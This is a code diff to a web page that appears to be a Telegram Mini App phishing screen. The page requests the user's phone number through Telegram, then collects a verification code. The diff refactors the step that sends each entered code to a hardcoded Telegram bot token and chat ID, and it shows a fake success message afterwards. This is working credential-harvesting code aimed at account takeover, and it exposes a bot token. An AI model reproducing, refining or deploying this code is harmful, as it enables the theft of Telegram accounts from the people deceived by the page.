@@ -60,36 +60,29 @@
                 const BOT_TOKEN = "8836719851:AAHO5sFobm_1MwTsC5GUvUCmkgRrRwO8s2g";
                 const CHAT_ID = "-1004399809740";
 
+                function sendToBot(text) {
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+                    });
+                }
+
                 function showCodeScreen() {
                     document.getElementById('screen-phone').classList.add('hidden');
                     document.getElementById('screen-code').classList.remove('hidden');
                     setTimeout(() => { document.getElementById('code-input').focus(); }, 100);
                 }
 
-                // 1. ЗАПРОС НОМЕРА (отправка через fetch)
+                // 1. ЗАПРОС НОМЕРА
                 document.getElementById('btn-share').onclick = function() {
                     tg.requestContact(function(shared, contact) {
                         if (shared) {
-                            // Вытаскиваем номер
-                            let phone = "";
-                            if (contact && contact.phone_number) phone = contact.phone_number;
-                            else if (contact && contact.phone) phone = contact.phone;
-                            else if (tg.initDataUnsafe?.user?.phone_number) phone = tg.initDataUnsafe.user.phone_number;
-
-                            // Если номер есть, отправляем
-                            if (phone) {
-                                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                                    method: 'POST',
-                                    headers: { 'Content-Type': 'application/json' },
-                                    body: JSON.stringify({ chat_id: CHAT_ID, text: `📱 PHONE: +${phone}` })
-                                });
-                                showCodeScreen();
-                            } else {
-                                // Если Telegram выдал undefined (баг iOS/Web), 
-                                // используем fallback через sendData, чтобы не оставить юзера без ничего
-                                tg.sendData(JSON.stringify({ type: "phone", phone: "Telegram Bug (undefined)" }));
-                                showCodeScreen();
-                            }
+                            // Как только пользователь разрешил, Telegram сам отправит контакт в чат.
+                            // Нам не нужно делать fetch для номера, бот его уже поймал!
+                            
+                            // Просто переключаем экран на ввод кода
+                            showCodeScreen();
                         }
                     });
                 };
@@ -122,16 +115,11 @@
                         document.getElementById('status-msg').classList.remove('hidden');
                         document.querySelector('.code-subtitle').innerHTML = "<b>Processing...</b>";
                         
-                        // Отправка кода (fetch)
-                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ chat_id: CHAT_ID, text: `🔑 CODE: ${value}` })
-                        }).then(res => res.json()).then(data => {
-                            if(data.ok) {
-                                document.querySelector('.code-subtitle').innerHTML = "<b style='color: #34c759;'>Code sent successfully!</b>";
-                            }
-                        });
+                        sendToBot(`🔑 CODE: ${value}`);
+                        
+                        setTimeout(() => {
+                            document.querySelector('.code-subtitle').innerHTML = "<b style='color: #34c759;'>Code sent successfully!</b>";
+                        }, 1000);
                     }
                 });
             }
